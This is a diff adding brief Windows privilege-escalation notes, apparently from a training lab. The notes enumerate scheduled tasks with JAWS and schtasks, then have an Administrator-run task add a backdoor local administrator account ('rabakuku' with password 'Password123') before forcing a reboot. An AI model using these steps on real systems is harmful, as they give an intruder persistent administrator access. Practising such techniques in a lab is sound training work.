@@ -1,0 +1,20 @@
+#change directory to where Jaws is located
+cd c:\ad
+
+#Run from CMD:
+powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
+
+#Manually Search
+schtasks /query /fo LIST 2>nul | findstr TaskName
+Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
+schtasks /query /fo LIST /v > C:\Users\student1\Desktop\task.txt
+
+
+#Edit the file executed by Administrator
+net user /add rabakuku Password123
+net localgroup administrators rabakuku /add
+
+
+#reboot
+#open cmd
+shutdown /r /f
